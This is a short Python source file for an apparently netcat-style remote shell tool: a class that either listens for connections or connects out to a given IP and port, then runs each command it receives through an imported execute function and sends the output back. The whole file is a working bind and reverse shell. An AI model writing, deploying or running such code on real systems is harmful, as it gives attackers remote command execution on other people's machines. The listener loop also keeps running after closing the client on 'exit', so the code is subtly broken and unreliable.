import socket
import threading
from get_shell import execute
class NOP:

	def __init__(self, args):
		self.args = args;
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		

	def run(self):
		if self.args.listen:
			self.listen()
		else:
			self.connect()


	def listen(self):

		self.socket.bind(("localhost", self.args.port))
		self.socket.listen(5)
		while True:
			client, addr = self.socket.accept()
			m_thread = threading.Thread(target=self.handle_client, args=(client,))
			m_thread.start()

	def handle_client(self, client):
		while True:
			client.sendall(b"-->")
			command_buffer = client.recv(128)
			if command_buffer.decode().strip() == "exit":
				print("May the force be with you")
				client.sendall(b'Goodbye old friend')
				client.close()
				
			response = execute(command_buffer.decode())
			if response:
				client.sendall(response)
			command_buffer = b""

	

	def connect(self):

		self.socket.connect((self.args.ip,self.args.port))
		while True:
			self.socket.send(b'-->')
			command = self.socket.recv(4096).decode().strip()
			if command == "exit":
				print("May the force be with you")
				self.socket.sendall(b'Goodbye old friend')
				break
			
			response = execute(command)
			self.socket.send(response)
			
